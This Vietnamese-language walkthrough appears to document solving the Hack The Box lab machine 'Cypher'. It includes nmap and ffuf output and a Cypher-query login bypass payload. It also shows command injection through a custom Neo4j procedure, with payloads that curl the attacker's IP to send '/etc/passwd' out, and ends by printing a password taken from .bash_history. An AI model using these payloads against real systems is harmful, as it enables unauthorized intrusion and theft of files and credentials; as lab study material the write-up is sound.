# Cypher

<img width="1451" height="661" alt="image" src="https://github.com/user-attachments/assets/c838478a-d0f7-4bc8-8fff-cad6cce9665d" />

Tôi dùng nmap để scan các port:
```
❯ sudo nmap -sV -sS 10.10.11.57
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-18 11:24 +0700
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```

Sau khi truy cập trên trình duyệt thì hiện ra trang web này, tôi có fuzz subdomain nhưng không ra được kết quả khả quan lắm

<img width="1862" height="952" alt="image" src="https://github.com/user-attachments/assets/6bb9022c-8df0-41fc-ab89-0948e5e7ab14" />

Ở trang web này có xuất hiện trang sign in:

<img width="1836" height="541" alt="image" src="https://github.com/user-attachments/assets/5f44e754-5105-4d82-acd9-968730c43c4f" />

<img width="1600" height="768" alt="image" src="https://github.com/user-attachments/assets/f1829ac8-f956-4912-9e9c-d13bfe3cdd98" />

Khi tôi thêm dấu `'` vào username thì hiển thị ra lỗi, có vẻ nó bị dính injection:

<img width="1515" height="765" alt="image" src="https://github.com/user-attachments/assets/674d1395-fd5b-45a5-a745-8e4f7c44ee9d" />

Đọc ở phần lỗi thì cấu trúc của câu truy vấn là `MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash`, tôi tạo payload là:
```
{"username":"test' OR true return \"a94a8fe5ccb19ba61c4c0873d391e987982fbbd3\" as hash; //","password":"test"}
```
Với đoạn hash ở đây là hash của `test` và khi mật khẩu trùng khớp với hash thì sẽ qua được login:

<img width="1498" height="649" alt="image" src="https://github.com/user-attachments/assets/12ca30d9-9504-4261-9b00-4cc416e85a55" />

Và có được cookie là `access-token`, sử dụng `Match and replace` để tiếp tục truy cập:

<img width="1039" height="685" alt="image" src="https://github.com/user-attachments/assets/07a24409-be70-4d7d-b650-a4522011fcd2" />

Và đây là trang demo:

<img width="1870" height="956" alt="image" src="https://github.com/user-attachments/assets/c7c416ff-b6c0-4240-9ab1-b3b99bd4748f" />

Tôi fuzz endpoint thì có cái `testing` nhìn đặc biệt:
```
❯ ffuf -u "http://cypher.htb/FUZZ" -w wordlist/super_mega_wordlist.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://cypher.htb/FUZZ
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/super_mega_wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 53ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
api/                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
demo/                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 83ms]
index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 55ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 53ms]
login.html              [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 54ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 53ms]
utils.js                [Status: 200, Size: 1548, Words: 325, Lines: 64, Duration: 54ms]
:: Progress: [78884/78884] :: Job [1/1] :: 724 req/sec :: Duration: [0:01:52] :: Errors: 2 ::
```
Ở đây có xuất hiện file jar:

<img width="709" height="318" alt="image" src="https://github.com/user-attachments/assets/17e5ce68-f969-46ab-bc37-5044eb1d53f2" />

Mở ra thì là src code của website, để ý dòng 29 là dòng dẫn đến cmdi:

<img width="1534" height="954" alt="image" src="https://github.com/user-attachments/assets/98331f14-930f-49bc-8bf5-d1306da42341" />

Khi tôi sử dụng:

```
MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://10.10.14.8:8888/") YIELD statusCode RETURN n.data, statusCode
```

Thì có request được gửi tới máy của tôi, cái này thì chỉ để check rằng web hoạt động ổn:

```
❯ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
10.10.11.57 - - [18/Sep/2025 12:48:06] "GET / HTTP/1.1" 200 -
```

Để khai thác được cmdi thì tôi inject vào url 

```
MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://test.com; curl http://10.10.14.8:8888/submit?lmao=hihi") YIELD statusCode RETURN n.data, statusCode
```
Chứng minh được có cmdi:

<img width="848" height="527" alt="image" src="https://github.com/user-attachments/assets/f333a40f-75d3-439a-8067-87811956714d" />

Tôi lấy đoạn script python để bắt các request post [server.py](https://github.com/namdt5125/road_to_hecker/blob/main/Cypher/server.py)

Tôi mở file `/etc/passwd` bằng payload:

```
MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://test.com; curl http://10.10.14.8:8888/submit?data=$(curl http://10.10.14.8:8888/submit -X POST -d \"data=$(cat /etc/passwd)\")") YIELD statusCode RETURN n.data, statusCode
```

Tôi biết được vị trí của `neo4j` là `/var/lib/neo4j` 

<img width="919" height="940" alt="image" src="https://github.com/user-attachments/assets/8a29ef18-aaf3-4a06-9dc0-b7d9a45416c8" />

Tôi `ls -la` thì ra như sau:
```
total 52
drwxr-xr-x 11 neo4j adm   4096 Feb 17  2025 .
drwxr-xr-x 50 root  root  4096 Feb 17  2025 ..
-rw-r--r--  1 neo4j neo4j   63 Oct  8  2024 .bash_history
drwxrwxr-x  3 neo4j adm   4096 Oct  8  2024 .cache
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 certificates
drwxr-xr-x  6 neo4j adm   4096 Oct  8  2024 data
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 import
drwxr-xr-x  2 neo4j adm   4096 Feb 17  2025 labs
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses
-rw-r--r--  1 neo4j adm     52 Oct  2  2024 packaging_info
drwxr-xr-x  2 neo4j adm   4096 Feb 17  2025 plugins
drwxr-xr-x  2 neo4j adm   4096 Feb 17  2025 products
drwxr-xr-x  2 neo4j adm   4096 Sep 17 06:24 run
lrwxrwxrwx  1 neo4j adm      9 Oct  8  2024 .viminfo -> /dev/null
```
Tôi mở file `.bash_history` thì có mật khẩu là:
```
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```
















